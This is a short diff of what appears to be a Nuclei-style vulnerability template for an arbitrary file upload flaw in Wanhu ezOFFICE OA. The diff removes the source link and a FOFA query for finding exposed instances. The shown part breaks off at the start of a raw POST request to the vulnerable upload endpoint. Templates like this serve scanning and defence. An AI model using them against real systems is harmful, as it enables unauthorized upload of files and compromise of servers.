@@ -3,12 +3,8 @@ info:
   name: 万户OA informationmanager_upload.jsp存在 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/amdce80kcc4uane9'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: amdce80kcc4uane9
-    fofa: app="万户ezOFFICE协同管理平台"
 http:
 - raw:
   - 'POST /defaultroot/information_manager/informationmanager_upload.jsp?upload=1&dispControl=null&saveControl=null HTTP/1.1
